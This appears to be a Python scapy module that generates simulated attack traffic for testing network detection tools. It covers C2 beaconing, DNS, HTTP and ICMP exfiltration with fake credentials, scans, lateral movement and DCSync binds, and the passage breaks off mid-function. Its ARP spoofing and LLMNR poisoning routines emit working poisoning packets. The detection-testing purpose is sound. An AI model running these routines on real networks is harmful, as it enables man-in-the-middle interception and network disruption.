"""
NetRunner OS - Adversary Traffic Simulations
Generates realistic attack traffic for NDR detection testing.
Crafts full TCP sessions (handshake + data + teardown) so NDR tools
can reconstruct and inspect application-layer content.
"""

import os
import time
import random
import string
import hashlib
import struct
from scapy.all import (
    Ether, ARP, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
    sendp, get_if_hwaddr, RandShort
)
from app.core.engine import active_task_status, log_message


def generate(params):
    """Dispatch to the appropriate adversary simulation."""
    sim = params.get('simulation', 'c2_beacon').lower()
    simulations = {
        'c2_beacon': _sim_c2_beacon,
        'dns_exfil': _sim_dns_exfil,
        'port_scan': _sim_port_scan,
        'lateral_movement': _sim_lateral_movement,
        'http_exfil': _sim_http_exfil,
        'dga': _sim_dga,
        'icmp_tunnel': _sim_icmp_tunnel,
        'llmnr_poison': _sim_llmnr_poison,
        'arp_spoof': _sim_arp_spoof,
        'dcsync': _sim_dcsync,
        'kerberoast': _sim_kerberoast,
        'ntlm_relay': _sim_ntlm_relay,
    }

    sim_func = simulations.get(sim)
    if not sim_func:
        log_message(f"[!] Unknown simulation: {sim}")
        active_task_status['is_running'] = False
        return

    try:
        log_message(f"[*] Starting adversary simulation: {sim}")
        sim_func(params)
    except Exception as e:
        log_message(f"[!!!] Simulation error: {e}")
        active_task_status['error'] = str(e)
    finally:
        active_task_status['is_running'] = False
        active_task_status['packets_per_second'] = 0
        log_message(f"[+] {sim} simulation finished.")


def _base_packet(params):
    iface = params['interface']
    src_mac = params.get('src_mac') or get_if_hwaddr(iface)
    dst_mac = params.get('dst_mac', 'ff:ff:ff:ff:ff:ff')
    return Ether(src=src_mac, dst=dst_mac)


def _send_with_tracking(packets, params, delay_override=None):
    iface = params['interface']
    delay = delay_override if delay_override is not None else params.get('delay', 1.0)
    total = len(packets)
    active_task_status['total'] = total

    pps_start = time.time()
    pps_count = 0

    for i, pkt in enumerate(packets):
        if not active_task_status['is_running']:
            log_message("[!] Stop signal received.")
            break

        sendp(pkt, iface=iface, verbose=0)
        active_task_status['progress'] = i + 1
        active_task_status['message'] = f"Sending packet {i+1}/{total}"

        pps_count += 1
        if time.time() - pps_start >= 1.0:
            active_task_status['packets_per_second'] = pps_count
            pps_count = 0
            pps_start = time.time()

        if delay > 0:
            time.sleep(delay)


# ── TCP Session Helpers ─────────────────────────────────────────────────────

def _tcp_handshake(base, src_ip, dst_ip, sport, dport):
    """
    Craft a full TCP 3-way handshake (SYN, SYN-ACK, ACK).
    Both client and server packets are injected onto the wire so the NDR
    can reconstruct the session.
    Returns (packets, client_seq, server_seq) for use in subsequent data packets.
    """
    seq_client = random.randint(1000000, 4294900000)
    seq_server = random.randint(1000000, 4294900000)

    packets = []

    # Client SYN
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='S',
            seq=seq_client, window=64240,
            options=[('MSS', 1460), ('SAckOK', b''), ('WScale', 7)])
    )

    # Server SYN-ACK
    packets.append(
        base / IP(src=dst_ip, dst=src_ip) /
        TCP(sport=dport, dport=sport, flags='SA',
            seq=seq_server, ack=seq_client + 1,
            window=65535,
            options=[('MSS', 1460), ('SAckOK', b''), ('WScale', 7)])
    )

    # Client ACK (completes handshake)
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='A',
            seq=seq_client + 1, ack=seq_server + 1,
            window=64240)
    )

    return packets, seq_client + 1, seq_server + 1


def _tcp_fin(base, src_ip, dst_ip, sport, dport, seq, ack):
    """Craft a TCP FIN teardown sequence."""
    packets = []

    # Client FIN-ACK
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='FA', seq=seq, ack=ack)
    )

    # Server FIN-ACK
    packets.append(
        base / IP(src=dst_ip, dst=src_ip) /
        TCP(sport=dport, dport=sport, flags='FA', seq=ack, ack=seq + 1)
    )

    # Client final ACK
    packets.append(
        base / IP(src=src_ip, dst=dst_ip) /
        TCP(sport=sport, dport=dport, flags='A', seq=seq + 1, ack=ack + 1)
    )

    return packets


def _build_tls_client_hello(hostname=''):
    """
    Build a realistic TLS 1.2 ClientHello record.
    Includes SNI extension, supported cipher suites, and random bytes
    so the NDR can parse the TLS layer and extract the SNI.
    """
    # Random bytes (32 bytes)
    client_random = os.urandom(32)

    # Session ID (32 bytes)
    session_id = os.urandom(32)

    # Cipher suites (common TLS 1.2 suites)
    cipher_suites = struct.pack('!H', 20) + struct.pack(
        '!10H',
        0xc02c,  # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
        0xc02b,  # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        0xc030,  # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
        0xc02f,  # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        0x009e,  # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
        0x009c,  # TLS_RSA_WITH_AES_128_GCM_SHA256
        0x002f,  # TLS_RSA_WITH_AES_128_CBC_SHA
        0x0035,  # TLS_RSA_WITH_AES_256_CBC_SHA
        0x000a,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        0x00ff,  # TLS_EMPTY_RENEGOTIATION_INFO_SCSV
    )

    # Compression methods
    compression = b'\x01\x00'  # 1 method: null

    # Extensions
    extensions = b''

    # SNI extension (type 0x0000)
    if hostname:
        host_bytes = hostname.encode()
        sni_list = struct.pack('!BH', 0, len(host_bytes)) + host_bytes
        sni_data = struct.pack('!H', len(sni_list)) + sni_list
        extensions += struct.pack('!HH', 0x0000, len(sni_data)) + sni_data

    # Supported groups extension (type 0x000a)
    groups_data = struct.pack('!H', 6) + struct.pack('!3H', 0x001d, 0x0017, 0x0018)
    extensions += struct.pack('!HH', 0x000a, len(groups_data)) + groups_data

    # Signature algorithms extension (type 0x000d)
    sig_algs = struct.pack('!H', 8) + struct.pack('!4H', 0x0401, 0x0501, 0x0601, 0x0201)
    extensions += struct.pack('!HH', 0x000d, len(sig_algs)) + sig_algs

    extensions_data = struct.pack('!H', len(extensions)) + extensions

    # ClientHello body
    client_hello_body = (
        b'\x03\x03' +                              # TLS 1.2
        client_random +                             # 32 bytes random
        struct.pack('!B', 32) + session_id +        # session ID
        cipher_suites +                             # cipher suites
        compression +                               # compression
        extensions_data                             # extensions
    )

    # Handshake header (type=ClientHello=1)
    handshake = b'\x01' + struct.pack('!I', len(client_hello_body))[1:] + client_hello_body

    # TLS record header (type=Handshake=0x16, version=TLS1.0=0x0301)
    record = b'\x16\x03\x01' + struct.pack('!H', len(handshake)) + handshake

    return record


# ── C2 Beaconing ─────────────────────────────────────────────────────────────

def _sim_c2_beacon(params):
    """
    C2 beaconing: periodic HTTPS callbacks with full TCP sessions.
    Crafts complete TCP handshakes, TLS ClientHello with SNI, server
    responses, and connection teardown for each beacon cycle.
    """
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 50)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    C2 Server: {c2_host}")
    log_message(f"    Beacon count: {count}")

    packets = []
    for i in range(count):
        sport = random.randint(49152, 65535)

        # TCP 3-way handshake
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, c2_host, sport, 443
        )
        packets.extend(hs_pkts)

        # TLS ClientHello with SNI
        tls_hello = _build_tls_client_hello(hostname=c2_host)
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=tls_hello)
        )
        client_seq += len(tls_hello)

        # Server ACK
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='A',
                seq=server_seq, ack=client_seq)
        )

        # Server TLS ServerHello + Certificate (simulated response)
        server_hello = b'\x16\x03\x03' + struct.pack('!H', 74)
        server_hello += b'\x02' + b'\x00\x00\x46'  # ServerHello handshake
        server_hello += b'\x03\x03'                 # TLS 1.2
        server_hello += os.urandom(32)              # server random
        server_hello += b'\x20' + os.urandom(32)    # session ID
        server_hello += struct.pack('!H', 0xc02f)   # cipher suite
        server_hello += b'\x00'                     # compression null
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=server_hello)
        )
        server_seq += len(server_hello)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # Encrypted application data (beacon payload)
        beacon_data = b'\x17\x03\x03' + struct.pack('!H', random.randint(64, 256))
        beacon_data += os.urandom(random.randint(64, 256))
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=beacon_data)
        )
        client_seq += len(beacon_data)

        # Server beacon response
        resp_data = b'\x17\x03\x03' + struct.pack('!H', random.randint(32, 128))
        resp_data += os.urandom(random.randint(32, 128))
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=443, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=resp_data)
        )
        server_seq += len(resp_data)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=443, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # TCP FIN teardown
        fin_pkts = _tcp_fin(base, src_ip, c2_host, sport, 443,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

    _send_with_tracking(packets, params, delay_override=None)


# ── DNS Exfiltration ─────────────────────────────────────────────────────────

def _sim_dns_exfil(params):
    """Data exfiltration over DNS using encoded subdomains."""
    domain = params.get('domain', 'evil-c2.xyz')
    count = params.get('count', 30)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    log_message(f"    Exfil domain: {domain}")
    log_message(f"    Encoding fake data into DNS queries")

    fake_data = "CONFIDENTIAL:username=admin;password=P@ssw0rd;ssn=123-45-6789;cc=4111111111111111"
    chunks = [fake_data[i:i+30] for i in range(0, len(fake_data), 30)]

    packets = []
    for i in range(count):
        chunk = chunks[i % len(chunks)]
        encoded = chunk.encode().hex()
        query_name = f"{encoded}.{i}.data.{domain}"

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=query_name, qtype="TXT")))
        packets.append(pkt)
        log_message(f"    DNS Exfil query: {query_name[:60]}...")

    _send_with_tracking(packets, params, delay_override=0.2)


# ── Port Scanning ────────────────────────────────────────────────────────────

def _sim_port_scan(params):
    """SYN port scan across common ports."""
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
        993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 8888
    ]

    log_message(f"    Target: {dst_ip}")
    log_message(f"    Scanning {len(common_ports)} common ports")

    packets = []
    sport = random.randint(40000, 60000)
    for port in common_ports:
        pkt = base / IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=port, flags='S')
        packets.append(pkt)
        sport += 1

    _send_with_tracking(packets, params, delay_override=0.05)


# ── Lateral Movement ─────────────────────────────────────────────────────────

def _sim_lateral_movement(params):
    """
    Lateral movement: SMB/WinRM/RDP/SSH attempts across a /24 subnet.
    Includes full TCP handshakes and protocol-specific payloads so the
    NDR sees actual service interaction, not just SYN packets.
    """
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    octets = dst_ip.split('.')
    subnet_prefix = '.'.join(octets[:3])

    lateral_ports = {
        445: "SMB",
        5985: "WinRM",
        3389: "RDP",
        135: "RPC",
        22: "SSH"
    }

    log_message(f"    Source: {src_ip}")
    log_message(f"    Target subnet: {subnet_prefix}.0/24")
    log_message(f"    Protocols: {', '.join(lateral_ports.values())}")

    packets = []
    targets = random.sample(range(1, 255), min(20, 254))
    for host in targets:
        target = f"{subnet_prefix}.{host}"
        for port, proto_name in lateral_ports.items():
            sport = random.randint(49152, 65535)

            # TCP 3-way handshake
            hs_pkts, client_seq, server_seq = _tcp_handshake(
                base, src_ip, target, sport, port
            )
            packets.extend(hs_pkts)

            # Protocol-specific payloads after handshake
            if port == 445:
                # SMB2 Negotiate Protocol Request
                smb_header = b'\x00\x00\x00\x72'     # NetBIOS session header
                smb_header += b'\xfeSMB'              # SMB2 magic
                smb_header += struct.pack('<H', 64)   # header length
                smb_header += struct.pack('<H', 0)    # credit charge
                smb_header += struct.pack('<I', 0)    # status
                smb_header += struct.pack('<H', 0)    # negotiate command
                smb_header += struct.pack('<H', 1)    # credits requested
                smb_header += struct.pack('<I', 0)    # flags
                smb_header += struct.pack('<I', 0)    # next command
                smb_header += struct.pack('<Q', 1)    # message ID
                smb_header += struct.pack('<I', 0)    # reserved
                smb_header += struct.pack('<I', 0)    # tree ID
                smb_header += struct.pack('<Q', 0)    # session ID
                smb_header += b'\x00' * 16            # signature
                # Negotiate body
                smb_header += struct.pack('<H', 36)   # struct size
                smb_header += struct.pack('<H', 2)    # dialect count
                smb_header += struct.pack('<H', 1)    # signing required
                smb_header += b'\x00' * 2             # reserved
                smb_header += struct.pack('<I', 0x7f) # capabilities
                smb_header += b'\x00' * 16            # client GUID
                smb_header += struct.pack('<I', 0)    # negotiate context offset
                smb_header += struct.pack('<H', 0)    # negotiate context count
                smb_header += b'\x00' * 2             # reserved
                smb_header += struct.pack('<H', 0x0202)  # SMB 2.0.2
                smb_header += struct.pack('<H', 0x0210)  # SMB 2.1

                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=smb_header)
                )
                client_seq += len(smb_header)

            elif port == 22:
                # SSH version banner
                ssh_banner = b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n'
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=ssh_banner)
                )
                client_seq += len(ssh_banner)

                # Server SSH banner response
                server_banner = b'SSH-2.0-OpenSSH_9.3\r\n'
                packets.append(
                    base / IP(src=target, dst=src_ip) /
                    TCP(sport=port, dport=sport, flags='PA',
                        seq=server_seq, ack=client_seq) /
                    Raw(load=server_banner)
                )
                server_seq += len(server_banner)

            elif port == 3389:
                # RDP X.224 Connection Request
                x224_cr = (
                    b'\x03\x00'                       # TPKT header
                    b'\x00\x2b'                       # length
                    b'\x26'                           # X.224 length
                    b'\xe0'                           # CR TPDU
                    b'\x00\x00'                       # dst ref
                    b'\x00\x00'                       # src ref
                    b'\x00'                           # class 0
                    b'Cookie: mstshash=admin\r\n'     # RDP cookie with username
                    b'\x01\x00\x08\x00\x03\x00\x00\x00'  # RDP negotiation request
                )
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=x224_cr)
                )
                client_seq += len(x224_cr)

            elif port == 5985:
                # WinRM HTTP POST
                winrm_post = (
                    f"POST /wsman HTTP/1.1\r\n"
                    f"Host: {target}:5985\r\n"
                    f"Content-Type: application/soap+xml;charset=UTF-8\r\n"
                    f"User-Agent: Microsoft WinRM Client\r\n"
                    f"Content-Length: 0\r\n"
                    f"Authorization: Negotiate TlRMTVNTUAABAAAA\r\n\r\n"
                ).encode()
                packets.append(
                    base / IP(src=src_ip, dst=target) /
                    TCP(sport=sport, dport=port, flags='PA',
                        seq=client_seq, ack=server_seq) /
                    Raw(load=winrm_post)
                )
                client_seq += len(winrm_post)

            # Server RST to simulate rejected/failed connection
            packets.append(
                base / IP(src=target, dst=src_ip) /
                TCP(sport=port, dport=sport, flags='RA',
                    seq=server_seq, ack=client_seq)
            )

        if not active_task_status['is_running']:
            break

    log_message(f"    Total connection attempts: {len(packets)}")
    _send_with_tracking(packets, params, delay_override=0.02)


# ── HTTP Data Exfiltration ───────────────────────────────────────────────────

def _sim_http_exfil(params):
    """
    Data exfiltration via large HTTP POST requests with full TCP sessions.
    The NDR will see complete HTTP sessions with large outbound payloads.
    """
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 10)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    Exfil target: {c2_host}")
    log_message(f"    Sending {count} large POST requests")

    packets = []
    for i in range(count):
        fake_data = ''.join(random.choices(
            string.ascii_letters + string.digits,
            k=random.randint(1000, 4000)
        ))
        sport = random.randint(49152, 65535)

        # TCP handshake
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, c2_host, sport, 80
        )
        packets.extend(hs_pkts)

        # HTTP POST with exfil data
        http_post = (
            f"POST /upload/data_{i} HTTP/1.1\r\n"
            f"Host: {c2_host}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(fake_data)}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"X-Session: {hashlib.md5(str(i).encode()).hexdigest()}\r\n"
            f"Connection: close\r\n\r\n"
            f"{fake_data}"
        ).encode()

        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=80, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=http_post)
        )
        client_seq += len(http_post)

        # Server ACK
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=80, dport=sport, flags='A',
                seq=server_seq, ack=client_seq)
        )

        # Server HTTP 200 OK response
        http_resp = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: text/plain\r\n"
            b"Content-Length: 2\r\n"
            b"Connection: close\r\n\r\n"
            b"OK"
        )
        packets.append(
            base / IP(src=c2_host, dst=src_ip) /
            TCP(sport=80, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=http_resp)
        )
        server_seq += len(http_resp)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=c2_host) /
            TCP(sport=sport, dport=80, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # TCP FIN teardown
        fin_pkts = _tcp_fin(base, src_ip, c2_host, sport, 80,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

        log_message(f"    Exfil POST #{i+1}: {len(fake_data)} bytes")

    _send_with_tracking(packets, params, delay_override=0.5)


# ── DGA Traffic ──────────────────────────────────────────────────────────────

def _sim_dga(params):
    """Domain Generation Algorithm traffic."""
    count = params.get('count', 50)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    tlds = ['.xyz', '.top', '.club', '.info', '.online', '.site', '.tk', '.pw']

    log_message(f"    Generating {count} DGA domains")

    packets = []
    seed = int(time.time())
    for i in range(count):
        h = hashlib.md5(f"{seed}_{i}".encode()).hexdigest()
        domain_len = random.randint(8, 16)
        dga_domain = h[:domain_len] + random.choice(tlds)

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=dga_domain)))
        packets.append(pkt)
        log_message(f"    DGA query: {dga_domain}")

    _send_with_tracking(packets, params, delay_override=0.1)


# ── ICMP Tunneling ──────────────────────────────────────────────────────────

def _sim_icmp_tunnel(params):
    """
    ICMP tunneling: data exfiltration hidden inside ICMP echo request payloads.
    Normal ICMP echo payloads are 32-56 bytes. This sends oversized payloads
    (200-500+ bytes) with encoded data, triggering NDR anomalous ICMP detections.
    Vectra, Darktrace, and ExtraHop all flag abnormal ICMP payload sizes.
    """
    count = params.get('count', 40)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    log_message(f"    Tunnel endpoint: {dst_ip}")
    log_message(f"    Exfil packets: {count}")

    # Fake sensitive data to encode into ICMP payloads
    exfil_data = (
        "BEGIN_EXFIL:user=administrator;ntlm_hash=aad3b435b51404eeaad3b435b51404ee:"
        "e19ccf75ee54e06b06a5907af13cef42;domain=CORP.LOCAL;dc=DC01;"
        "krbtgt_hash=f3bc61e97fb14d18c42f9f3b1a8e3a0d;trust_key=9a8b7c6d5e4f3a2b;"
        "backup_key=MIIJQgIBADANBgkqhkiG9w0BAQEFAASC:END_EXFIL"
    )
    chunks = [exfil_data[i:i+60] for i in range(0, len(exfil_data), 60)]

    packets = []
    seq_num = 1
    for i in range(count):
        chunk = chunks[i % len(chunks)]
        # Encode the chunk and pad to create oversized payload (200-500 bytes)
        encoded = chunk.encode().hex().encode()
        padding = os.urandom(random.randint(100, 300))
        payload = encoded + b'\x00' + padding

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               ICMP(type=8, code=0, id=0x1337, seq=seq_num) /
               Raw(load=payload))
        packets.append(pkt)

        # Simulated echo reply with response data (bidirectional tunnel)
        reply_payload = os.urandom(random.randint(150, 400))
        reply_pkt = (base / IP(src=dst_ip, dst=src_ip) /
                     ICMP(type=0, code=0, id=0x1337, seq=seq_num) /
                     Raw(load=reply_payload))
        packets.append(reply_pkt)

        seq_num += 1

    log_message(f"    Avg payload size: ~{sum(len(p[Raw].load) for p in packets) // len(packets)} bytes (normal: 32-56)")
    _send_with_tracking(packets, params, delay_override=0.15)


# ── LLMNR / NBT-NS Poisoning ───────────────────────────────────────────────

def _sim_llmnr_poison(params):
    """
    LLMNR/NBT-NS poisoning (T1557.001): simulates Responder-style attacks.
    Sends spoofed LLMNR responses on multicast 224.0.0.252:5355 and
    NBT-NS responses on broadcast UDP 137 claiming to be requested hosts.
    NDR tools detect unsolicited name resolution responses from unexpected sources.
    """
    count = params.get('count', 30)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    Poisoner IP: {src_ip}")
    log_message(f"    Poisoning LLMNR (224.0.0.252:5355) + NBT-NS (broadcast:137)")

    # Common hostnames that get queried via LLMNR/NBT-NS
    target_names = [
        'WPAD', 'FILESERVER', 'SHAREPOINT', 'EXCHANGE', 'PRINTER',
        'SQL01', 'BACKUP', 'INTRANET', 'PROXY', 'DC01', 'WEBMAIL',
        'APP01', 'CITRIX', 'VPN', 'NAS01'
    ]

    packets = []
    for i in range(count):
        hostname = target_names[i % len(target_names)]

        # ── LLMNR Response (UDP 5355 to multicast 224.0.0.252) ──
        # LLMNR uses DNS-like format with transaction ID, flags, and RRs
        txn_id = random.randint(0x1000, 0xFFFF)
        name_encoded = b''
        for label in hostname.split('.'):
            name_encoded += struct.pack('!B', len(label)) + label.encode()
        name_encoded += b'\x00'

        # LLMNR response: flags=0x8000 (response), 1 question, 1 answer
        llmnr_resp = struct.pack('!HHHHHH', txn_id, 0x8000, 1, 1, 0, 0)
        # Question section
        llmnr_resp += name_encoded + struct.pack('!HH', 1, 1)  # Type A, Class IN
        # Answer section: pointer to name + A record with our IP
        llmnr_resp += name_encoded + struct.pack('!HH', 1, 1)  # Type A, Class IN
        llmnr_resp += struct.pack('!I', 30)  # TTL 30s
        llmnr_resp += struct.pack('!H', 4)   # Data length
        llmnr_resp += bytes(int(o) for o in src_ip.split('.'))  # Our IP as answer

        pkt_llmnr = (base / IP(src=src_ip, dst='224.0.0.252') /
                     UDP(sport=5355, dport=5355) /
                     Raw(load=llmnr_resp))
        packets.append(pkt_llmnr)

        # ── NBT-NS Response (UDP 137 broadcast) ──
        # NetBIOS name: 16 chars padded with spaces, then "half-ASCII" encoded
        nb_name = hostname.ljust(15) + '\x00'  # 15 chars + null suffix (workstation)
        encoded_name = b''
        for ch in nb_name.encode():
            encoded_name += bytes([0x41 + (ch >> 4), 0x41 + (ch & 0x0F)])

        nbt_txn = random.randint(0x1000, 0xFFFF)
        nbt_resp = struct.pack('!HHHHHH', nbt_txn, 0x8500, 0, 1, 0, 0)  # Positive response
        # Name: length-prefixed encoded name + scope (null)
        nbt_resp += struct.pack('!B', 32) + encoded_name + b'\x00'
        nbt_resp += struct.pack('!HH', 0x0020, 0x0001)  # NB type, IN class
        nbt_resp += struct.pack('!I', 30)  # TTL
        nbt_resp += struct.pack('!H', 6)   # Data length (flags + IP)
        nbt_resp += struct.pack('!H', 0)   # NB flags (B-node, unique)
        nbt_resp += bytes(int(o) for o in src_ip.split('.'))

        dst_ip = params.get('dst_ip', '255.255.255.255')
        pkt_nbt = (base / IP(src=src_ip, dst=dst_ip) /
                   UDP(sport=137, dport=137) /
                   Raw(load=nbt_resp))
        packets.append(pkt_nbt)

        log_message(f"    Poisoning: {hostname} -> {src_ip}")

    _send_with_tracking(packets, params, delay_override=0.3)


# ── ARP Spoofing ────────────────────────────────────────────────────────────

def _sim_arp_spoof(params):
    """
    ARP spoofing/cache poisoning (T1557): sends gratuitous ARP replies
    claiming another host's IP belongs to our MAC. Classic MitM setup.
    NDR tools detect duplicate IP-to-MAC mappings and ARP anomalies.
    """
    count = params.get('count', 30)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    iface = params['interface']
    src_mac = params.get('src_mac') or get_if_hwaddr(iface)

    log_message(f"    Attacker MAC: {src_mac}")
    log_message(f"    Spoofing: {dst_ip} is-at {src_mac}")
    log_message(f"    Target (victim): {src_ip}")

    # Derive gateway (common .1) if dst_ip looks like a gateway
    octets = dst_ip.split('.')
    subnet_prefix = '.'.join(octets[:3])

    packets = []
    for i in range(count):
        # Gratuitous ARP reply: "dst_ip is at our MAC" -> sent to victim
        # This poisons the victim's ARP cache for the gateway
        pkt_gw = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
                  ARP(op=2,  # ARP reply
                      hwsrc=src_mac,
                      psrc=dst_ip,       # Claim to be the gateway/target
                      hwdst='ff:ff:ff:ff:ff:ff',
                      pdst=src_ip))      # Tell the victim
        packets.append(pkt_gw)

        # Also spoof the reverse direction: "victim IP is at our MAC" -> sent to gateway
        pkt_victim = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
                      ARP(op=2,
                          hwsrc=src_mac,
                          psrc=src_ip,       # Claim to be the victim
                          hwdst='ff:ff:ff:ff:ff:ff',
                          pdst=dst_ip))      # Tell the gateway
        packets.append(pkt_victim)

        # Throw in some ARP requests too (reconnaissance pattern)
        if i % 5 == 0:
            target_host = f"{subnet_prefix}.{random.randint(1, 254)}"
            pkt_scan = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
                        ARP(op=1,  # ARP request
                            hwsrc=src_mac,
                            psrc=src_ip,
                            hwdst='00:00:00:00:00:00',
                            pdst=target_host))
            packets.append(pkt_scan)

    log_message(f"    Total ARP packets: {len(packets)}")
    _send_with_tracking(packets, params, delay_override=0.5)


# ── DCSync Attack ───────────────────────────────────────────────────────────

def _sim_dcsync(params):
    """
    DCSync attack (T1003.006): simulates Active Directory replication
    requests (DsGetNCChanges) over MS-DRSR/RPC.
    A non-DC host initiating directory replication is a high-fidelity
    indicator detected by all major NDR/EDR tools.
    Full TCP sessions with RPC bind to DRSUAPI UUID.
    """
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']  # Domain controller IP
    base = _base_packet(params)
    count = params.get('count', 5)

    log_message(f"    Attacker: {src_ip}")
    log_message(f"    Domain Controller: {dst_ip}")
    log_message(f"    Simulating {count} replication requests")

    # DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
    drsuapi_uuid = (
        b'\x35\x42\x51\xe3\x06\x4b\xd1\x11'
        b'\xab\x04\x00\xc0\x4f\xc2\xdc\xd2'
    )
    drsuapi_version = struct.pack('<H', 4) + struct.pack('<H', 0)

    # Naming contexts to replicate (what a real DCSync requests)
    naming_contexts = [
        'DC=corp,DC=local',
        'CN=Configuration,DC=corp,DC=local',
        'CN=Schema,CN=Configuration,DC=corp,DC=local',
    ]

    packets = []
    for i in range(count):
        sport = random.randint(49152, 65535)

        # ── Phase 1: RPC Endpoint Mapper (port 135) ──
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, dst_ip, sport, 135
        )
        packets.extend(hs_pkts)

        # RPC Bind to ISystemActivator on EPM
        # DCE/RPC bind header
        rpc_bind = bytearray()
        rpc_bind += b'\x05'           # version major
        rpc_bind += b'\x00'           # version minor
        rpc_bind += b'\x0b'           # bind
        rpc_bind += b'\x03'           # PFC first+last frag
        rpc_bind += b'\x10\x00\x00\x00'  # data representation (little-endian)
        rpc_bind += struct.pack('<H', 72)  # frag length
        rpc_bind += struct.pack('<H', 0)   # auth length
        rpc_bind += struct.pack('<I', i)   # call ID
        # Bind body
        rpc_bind += struct.pack('<H', 5840)  # max xmit frag
        rpc_bind += struct.pack('<H', 5840)  # max recv frag
        rpc_bind += struct.pack('<I', 0)     # assoc group
        rpc_bind += struct.pack('<I', 1)     # num context items
        # Context item: DRSUAPI
        rpc_bind += struct.pack('<H', 0)     # context ID
        rpc_bind += struct.pack('<H', 1)     # num trans items
        rpc_bind += drsuapi_uuid             # abstract syntax UUID
        rpc_bind += drsuapi_version          # interface version
        # Transfer syntax: NDR UUID 8a885d04-1ceb-11c9-9fe8-08002b104860
        rpc_bind += (
            b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11'
            b'\x9f\xe8\x08\x00\x2b\x10\x48\x60'
        )
        rpc_bind += struct.pack('<H', 2) + struct.pack('<H', 0)  # NDR version 2.0

        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport, dport=135, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=bytes(rpc_bind))
        )
        client_seq += len(rpc_bind)

        # Server bind ACK
        rpc_bind_ack = bytearray()
        rpc_bind_ack += b'\x05\x00\x0c\x03'  # version, bind_ack, flags
